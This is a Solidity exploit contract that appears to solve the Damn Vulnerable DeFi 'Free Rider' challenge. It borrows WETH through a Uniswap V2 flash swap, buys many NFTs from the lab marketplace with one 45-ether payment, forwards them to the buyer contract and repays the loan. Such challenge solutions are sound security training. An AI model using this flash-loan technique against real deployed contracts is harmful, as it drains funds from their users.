pragma solidity ^0.8.0;

import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol';
//import '@uniswap/lib/contracts/libraries/Babylonian.sol';
//import '@uniswap/lib/contracts/libraries/TransferHelper.sol';

//import '@uniswap/v2-periphery/contracts/libraries/UniswapV2Library.sol';
import '@uniswap/v2-periphery/contracts/interfaces/V1/IUniswapV1Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/V1/IUniswapV1Exchange.sol';
//import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router01.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IERC20.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IWETH.sol';
import 'hardhat/console.sol';
import "../Problems/damnvulnerabledefi/utils/WETH9.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "../Problems/damnvulnerabledefi/10/FreeRiderNFTMarketplace.sol";
import "../Problems/damnvulnerabledefi/10/FreeRiderBuyer.sol";
//import '@uniswap/v2-core/contracts/libraries/SafeMath.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol';
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract FreeRiderContractor is IUniswapV2Callee, IERC721Receiver {
    //    using SafeMath  for uint;
    IUniswapV2Factory FACTORY;
    address payable WETH;
    FreeRiderNFTMarketplace marketPlace;
    FreeRiderBuyer buyer;


    event Log(string message, uint val);

    constructor(address _factory, address payable weth, address payable _marketplace, address _buyer) public payable {
        FACTORY = IUniswapV2Factory(_factory);
        WETH = weth;
        marketPlace = FreeRiderNFTMarketplace(_marketplace);
        buyer = FreeRiderBuyer(_buyer);
    }

    // needs to accept ETH from any V1 exchange and WETH. ideally this could be enforced, as in the router,
    // but it's not possible because it requires a call to the v1 factory, which takes too much gas
    receive() external payable {}

    function doFlashSwap(uint256[] calldata idList, address tokenBorrowed, uint256 amount) public {
        address pair = FACTORY.getPair(tokenBorrowed, WETH);
        require(pair != address(0), "Pair does not exist");

        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        uint256 amount0Out = (WETH == token0) ? amount : 0;
        uint256 amount1Out = (WETH == token1) ? amount : 0;

        bytes memory data = abi.encode(idList, amount);


        IUniswapV2Pair(pair).swap(amount0Out, amount1Out, address(this), data);

    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0();
        address token1 = IUniswapV2Pair(msg.sender).token1();

        address pair = FACTORY.getPair(token0, token1);

        require(msg.sender == pair, "Pair is invalid");
        require(sender == address(this), "Address should be this contract");

        (uint256[] memory idList, uint256 amount) = abi.decode(data, (uint256[], uint));
        WETH9(WETH).withdraw(45 ether);
        marketPlace.buyMany{value : 45 ether}(idList);
        for (uint256 i = 0; i < idList.length; i++) {
            marketPlace.token().safeTransferFrom(address(this), address(buyer) , idList[i], "");
        }

        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToRepay = amount + fee;
        WETH9(WETH).deposit{value: 45 ether}();
        console.log("amountToRepay",  marketPlace.token().ownerOf(0));
        console.log("address",  address (this));
        IERC20(WETH).transfer(pair, amountToRepay);

    }

    function onERC721Received(
        address from,
        address to,
        uint256 _tokenId,
        bytes memory data
    )
    external
    override
    returns (bytes4)
    {
        return IERC721Receiver.onERC721Received.selector;
    }
}
